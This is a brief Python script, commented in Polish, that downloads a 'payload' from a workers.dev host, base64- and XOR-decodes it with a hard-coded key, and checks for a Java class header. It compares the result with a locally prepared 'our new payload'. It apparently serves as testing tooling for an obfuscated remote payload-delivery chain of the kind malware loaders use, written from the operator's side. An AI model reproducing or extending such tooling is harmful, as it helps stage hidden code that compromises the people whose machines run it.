#!/usr/bin/env python3
import base64
import requests

def simple_xor_decode(data, key):
    """Simple XOR decoding with key"""
    key_bytes = key.encode('utf-8')
    result = bytearray()
    
    for i, byte in enumerate(data):
        result.append(byte ^ key_bytes[i % len(key_bytes)])
    
    return bytes(result)

# Pobierz aktualny payload z serwera
response = requests.get("https://notoggogolnie.xx570186.workers.dev/payload")
server_payload = response.text.strip()

print(f"Server payload size: {len(server_payload)} characters")
print(f"First 100 chars: {server_payload[:100]}")

# Spróbuj zdekodować jako base64
try:
    encoded_bytes = base64.b64decode(server_payload)
    print(f"Base64 decoded size: {len(encoded_bytes)} bytes")
    
    # Spróbuj XOR decode
    key = "DurexKey"
    decoded_bytes = simple_xor_decode(encoded_bytes, key)
    
    # Sprawdź magic number
    if len(decoded_bytes) >= 4:
        magic = int.from_bytes(decoded_bytes[:4], 'big')
        print(f"XOR decoded magic: 0x{magic:08x}")
        if magic == 0xCAFEBABE:
            print("✅ XOR decode successful!")
        else:
            print("❌ XOR decode failed - wrong magic number")
    
    # Sprawdź czy to może być stary format AES
    print(f"First 16 bytes (hex): {encoded_bytes[:16].hex()}")
    
except Exception as e:
    print(f"Error: {e}")

# Sprawdź czy nasz nowy payload działa
print("\n--- Testing our new payload ---")
with open('payload_simple.b64', 'r') as f:
    our_payload = f.read().strip()

try:
    encoded_bytes = base64.b64decode(our_payload)
    decoded_bytes = simple_xor_decode(encoded_bytes, key)
    
    if len(decoded_bytes) >= 4:
        magic = int.from_bytes(decoded_bytes[:4], 'big')
        print(f"Our payload magic: 0x{magic:08x}")
        if magic == 0xCAFEBABE:
            print("✅ Our payload is correct!")
        else:
            print("❌ Our payload is wrong")
            
except Exception as e:
    print(f"Error with our payload: {e}")